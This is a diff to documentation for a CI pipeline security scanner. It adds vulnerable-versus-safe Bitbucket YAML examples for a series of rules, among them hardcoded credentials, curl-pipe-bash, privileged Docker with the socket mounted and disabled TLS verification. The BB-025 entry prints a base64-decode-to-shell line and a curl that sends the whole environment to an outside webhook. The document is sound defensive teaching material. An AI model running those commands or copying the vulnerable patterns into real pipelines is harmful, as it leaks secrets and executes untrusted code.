@@ -2548,6 +2548,33 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
+# whatever the publisher's latest 1.x image is at job
+# start. A publisher takeover (compromised Atlassian
+# Marketplace account, leaked token) repoints the tag
+# silently; every consumer's pipeline executes the new
+# image on the next run.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1
+            variables: { ... }
+
+# Safe: pin to an exact version (``X.Y.Z``). Renovate /
+# Dependabot's bitbucket-pipe ecosystem bumps these in
+# reviewable PRs.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1.7.0
+            variables: { ... }
+```
+
 **Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }
@@ -2610,6 +2637,35 @@ pipelines:
 
 **Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: literal AWS access key in pipeline-level
+# ``variables:``. The ``bitbucket-pipelines.yml`` is
+# committed to git; the build log echoes the value on
+# any step that prints env vars.
+variables:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+pipelines:
+  default:
+    - step:
+        script:
+          - aws s3 cp ./build s3://bucket/
+
+# Safe: store the credentials as Repository / Workspace
+# variables marked ``secured`` in Bitbucket Settings.
+# The pipeline file references the env names; the values
+# resolve at runtime and are masked in logs.
+pipelines:
+  default:
+    - step:
+        script:
+          # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY are
+          # configured as Repository Variables (secured)
+          - aws s3 cp ./build s3://bucket/
+```
+
 **Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }
@@ -2668,6 +2724,32 @@ pipelines:
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a credential-shaped literal anywhere in
+# the pipeline body (step env, inline script, after-
+# script body). Anyone with repo read sees it; build
+# logs echo it whenever the step prints its env.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -H "Authorization: Bearer ghp_abcdef1234567890abcdef1234567890abcdef12" \
+              https://api.github.com/repos/org/repo/issues
+
+# Safe: route the credential through a secured
+# Repository / Workspace Variable. The pipeline body
+# carries the env name, never the value.
+pipelines:
+  default:
+    - step:
+        script:
+          # GITHUB_TOKEN is a secured Workspace Variable
+          - curl -H "Authorization: Bearer $GITHUB_TOKEN" \
+              https://api.github.com/repos/org/repo/issues
+```
+
 **Source:** [`BB-008`](../providers/bitbucket.md#bb-008) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }
@@ -2687,6 +2769,48 @@ pipelines:
 **How this is detected.** Bitbucket steps declare artifacts on the producer and downstream steps implicitly receive them. When an unprivileged step produces an artifact and a later `deployment:` step consumes it without verification, attacker-controlled output flows into the privileged stage.
 
 **Recommendation.** Add a verification step before the deploy step consumes the artifact: `sha256sum -c artifact.sha256` against a manifest the producer signed, or `cosign verify` over the artifact directly. Alternatively, restrict the artifact-producing step to non-PR pipelines via ``branches:`` or ``custom:`` triggers.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a deploy step consumes ``build`` artifacts
+# produced by a PR-triggered build step. A fork PR's
+# build step uploads anything as ``build``; the deploy
+# step (which runs with the production credential set)
+# executes the attacker's binary.
+pipelines:
+  pull-requests:
+    "**":
+      - step:
+          name: build
+          script: ["./build.sh"]
+          artifacts: ["dist/**"]
+      - step:
+          name: deploy   # consumes the PR build's artifact
+          deployment: staging
+          script: ["./deploy ./dist/release"]
+
+# Safe: don't hand off PR artifacts to a deploy step.
+# Deploy only on ``branches: { main: ... }`` triggers,
+# where the artifact's producer was the trusted-context
+# build of ``main`` itself.
+pipelines:
+  pull-requests:
+    "**":
+      - step:
+          name: build
+          script: ["./build.sh"]
+  branches:
+    main:
+      - step:
+          name: build
+          script: ["./build.sh"]
+          artifacts: ["dist/**"]
+      - step:
+          name: deploy
+          deployment: production
+          script: ["./deploy ./dist/release"]
+```
 
 **Source:** [`BB-010`](../providers/bitbucket.md#bb-010) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2716,6 +2840,30 @@ pipelines:
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` install one-liner. A MITM
+# (compromised corporate proxy) or a hijacked installer
+# endpoint ships malicious code into the step's shell
+# with the pipeline's full credential set in scope.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          - echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          - bash /tmp/cli.sh
+```
+
 **Source:** [`BB-012`](../providers/bitbucket.md#bb-012) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-013`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-013 }
@@ -2728,6 +2876,33 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket inside a Bitbucket step. The step is
+# already a container; granting it privileged access
+# and the runner's docker.sock collapses every isolation
+# boundary the pipeline had.
+pipelines:
+  default:
+    - step:
+        services: [docker]
+        script:
+          - docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock \
+              myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the build needs to build an image, use Kaniko /
+# BuildKit rootless instead.
+pipelines:
+  default:
+    - step:
+        services: [docker]
+        script:
+          - docker run myapp@sha256:abc123... ./integration.sh
+```
+
 **Source:** [`BB-013`](../providers/bitbucket.md#bb-013) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }
@@ -2739,6 +2914,31 @@ pipelines:
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification on the
+# named host. A network attacker swaps wheels in flight.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pip install --index-url http://internal-pypi.example.com/simple \
+              --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA installed
+# in the image's trust store.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim@sha256:abc123...
+        script:
+          - pip install --index-url https://internal-pypi.example.com/simple \
+              --require-hashes -r requirements.txt
+```
 
 **Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2772,6 +2972,32 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``BITBUCKET_REPO_ACCESS_TOKEN`` written to
+# a file or piped to ``tee`` for downstream steps. The
+# token is meant to live only for the step's duration;
+# persisting it into an artifact or a cache extends the
+# credential's lifetime well beyond its intended scope.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo "TOKEN=$BITBUCKET_REPO_ACCESS_TOKEN" >> .env
+        artifacts: [.env]
+
+# Safe: use the token inline in the one command that
+# needs it. Bitbucket scopes the token to the step's
+# lifetime and revokes it on exit.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl --header "Authorization: Bearer $BITBUCKET_REPO_ACCESS_TOKEN" \
+              "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_REPO_FULL_NAME"
+```
+
 **Source:** [`BB-017`](../providers/bitbucket.md#bb-017) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-018`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-018 }
@@ -2795,6 +3021,34 @@ pipelines:
 **Known false positives.**
 
 - The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``after-script`` runs even when the main
+# script fails. Echoing a secret env var here lands the
+# value in the build log on every failed build — which
+# is exactly when the log gets the most attention.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./deploy.sh   # uses $DEPLOY_KEY
+        after-script:
+          - echo "Deploy attempted with $DEPLOY_KEY"   # leaks on failure
+
+# Safe: after-script body references only step IDs /
+# build metadata, never the secret env vars themselves.
+# Failure diagnostics belong in the main script, where
+# Bitbucket masks secured-variable values in output.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./deploy.sh
+        after-script:
+          - echo "Deploy step $BITBUCKET_BUILD_NUMBER complete."
+```
 
 **Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2846,6 +3100,34 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` / ``NODE_TLS_
+# REJECT_UNAUTHORIZED=0``) disables certificate
+# verification for the duration. A network attacker MITMs
+# the registry and ships substituted tarballs.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - npm config set strict-ssl false
+          - npm install
+
+# Safe: install the missing CA into the image's trust
+# store; keep strict-ssl on.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+          - update-ca-certificates
+          - npm install
+```
+
 **Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }
@@ -2871,6 +3153,32 @@ pipelines:
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to a third-party webhook, or runs a
+# known miner binary. A malicious PR (or a compromised
+# maintainer) lands the payload in the pipeline file;
+# every subsequent build executes it.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo Z2g6Li4uIA== | base64 -d | sh
+          - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# base64 -d | sh pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+pipelines:
+  default:
+    - step:
+        script:
+          - make build
+```
+
 **Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-026 }
@@ -2884,6 +3192,30 @@ pipelines:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a variable that came from a
+# pipeline variable / deployment env gives that value
+# full shell-grammar reach. ``sh -c $RAW`` on an
+# unquoted variable is the same shape.
+pipelines:
+  default:
+    - step:
+        script:
+          - eval "$BUILD_CMD"
+          - sh -c $RAW_HOOK
+
+# Safe: invoke a script you own with the value as a
+# quoted argument; let the script validate against an
+# allow-list. Never eval values from outside the step.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./scripts/dispatch.sh "$BUILD_CMD"
+```
 
 **Source:** [`BB-026`](../providers/bitbucket.md#bb-026) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2905,6 +3237,37 @@ pipelines:
 
 **Recommendation.** Every step that sets ``oidc: true`` must also declare a ``deployment:`` (production / staging / test). Bitbucket deployments enforce manual approvals, restricted variables, and audit logs that an ungated step bypasses. Steps reached through ``pull-requests:`` should never request OIDC tokens, any forked PR can drive the role assumption.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an OIDC step (``oidc: true``) runs on every
+# trigger, including pull-request builds. The OIDC role's
+# trust policy accepts any token from the repo, so a
+# fork-PR build assumes prod and runs whatever the role
+# permits.
+pipelines:
+  default:
+    - step:
+        oidc: true
+        script:
+          - aws configure set role_arn arn:aws:iam::123:role/prod
+          - aws deploy ...
+
+# Safe: route the OIDC step through a deployment-gated
+# environment (Bitbucket Deployments) so reviewer
+# approval is required before the token is minted, and
+# restrict the trigger to the protected branch.
+pipelines:
+  branches:
+    main:
+      - step:
+          oidc: true
+          deployment: production   # reviewer-gated
+          script:
+            - aws configure set role_arn arn:aws:iam::123:role/prod
+            - aws deploy ...
+```
+
 **Source:** [`BB-028`](../providers/bitbucket.md#bb-028) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-029`: image: (step or service) not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-029 }
@@ -2918,6 +3281,31 @@ pipelines:
 **Known false positives.**
 
 - Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: python:3.12-slim`` is a mutable
+# tag. Docker Hub's image team rebuilds it on every
+# Python point release; a publisher takeover ships code
+# into every Bitbucket pipeline that uses the tag.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pytest
+
+# Safe: pin to the content-addressable digest. The pin
+# documents which version the digest corresponded to so
+# bumps stay reviewable.
+pipelines:
+  default:
+    - step:
+        image: python@sha256:abc123...  # python:3.12.1-slim
+        script:
+          - pytest
+```
 
 **Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).
 
